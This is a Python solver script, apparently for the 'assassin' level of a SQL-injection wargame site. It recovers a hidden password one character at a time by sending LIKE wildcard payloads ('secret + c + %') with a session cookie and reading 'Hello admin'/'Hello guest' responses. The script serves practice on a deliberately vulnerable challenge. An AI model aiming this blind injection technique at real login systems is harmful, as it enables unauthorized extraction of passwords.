import requests
import string
import time

def string_to_hex(s):
    return ''.join(format(ord(char), '02x') for char in s)

def string_to_binary(s):
    concat = ''
    for c in s:
        val = ord(c)
        res = ''
        while val:
            res += str(int(val%2))
            val //= 2
        res += '0'*(8-len(res))
        concat += res[::-1]
    return concat
    # return ''.join(format(ord(char), '02x') for char in s)

# print(string_to_binary('^FLAG{$'))

URL = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
SESSION_ID = "tbm4o2jsok14jk1i8n7bhcov7a"
cookies = {'PHPSESSID':SESSION_ID}
params ={'pw':''}

secret = ""
i = len(secret)+1

remember = ''
flag_found = False
while len(secret) < 8:    
    for c in string.digits+string.ascii_letters:
        # if i==1 and c=='d' or c=='D':
            # continue
        guess_pass = (secret+c).replace("_", r"\_")
        binary = string_to_binary((secret+c).replace("_", r"\_"))
        hex = string_to_hex((secret+c).replace("_", r"\_"))
        payload = secret + c + '%'
        
        print(f"{c}: {payload}")
        params['pw'] = payload
        # print(c)
        response = requests.get(URL,params=params, cookies=cookies)
        if 'Hello guest' in response.text:
            remember = c
        # print(f"Time: {after - before} seconds")
        if 'Hello admin' in response.text:
            i += 1      
            secret += c
            flag_found = True
            print(secret)
            break
    if not flag_found:
        secret += remember
        print(secret)

    flag_found = False
    

